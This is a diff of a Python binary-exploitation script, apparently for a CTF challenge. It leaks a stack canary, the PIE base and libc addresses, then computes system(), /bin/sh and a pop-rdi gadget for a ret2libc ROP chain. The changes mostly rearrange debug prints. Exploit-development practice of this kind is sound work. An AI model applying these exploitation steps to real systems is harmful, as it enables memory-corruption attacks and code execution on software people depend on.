@@ -54,6 +54,8 @@ p.sendline(payload2)
 libc_csu_init_leak = int(p.recvline(), 16)
 pie_base = libc_csu_init_leak - 6240
 
+print "libc_csu_init() leak:", hex(libc_csu_init_leak)
+print "PIE Base Address:", hex(pie_base)
 
 # libc_read Leak Setup
 time.sleep(1)
@@ -71,6 +73,10 @@ libc_read = libc_leak - 17
 #libc_main = libc_read - 
 libc_system = libc_read - 0xc0ca0
 p.clean()
+
+print "libc leak: ", hex(libc_leak)
+print "libc_read() leak:", hex(libc_read)
+print "libc_system() leak:", hex(libc_system)
 
 # Spend $ to trigger warning()
 for i in range(7):
@@ -98,22 +104,12 @@ p.clean()
 # \x00 at end of Stack Canary stops overflow @ 32 bytes not allowing
 # "C" padding overflows
 
-# 0x00000000000018bb : pop rdi ; ret
+binsh = libc_read + 0xa3f7a
 pop_rdi = pie_base + 0x18bb
 ret = pie_base + 0x1016
-binsh = libc_read + 0xa3f7a
 
-
-print "Canary leak:", hex(canary_leak)
-print "libc_csu_init() leak:", hex(libc_csu_init_leak)
-print "PIE Base Address:", hex(pie_base)
-print "ROP Gadget Address:", hex(pop_rdi)
-print "libc leak: ", hex(libc_leak)
-print "libc_read() leak:", hex(libc_read)
-#print "libc_main() leak:", hex(libc_main)
-print "libc_system() leak:", hex(libc_system)
 print "/bin/sh leak:", hex(binsh)
-
+print "ROP Gadget Address:", hex(pop_rdi)
 
 # Stack Canary Bypass
 time.sleep(1)
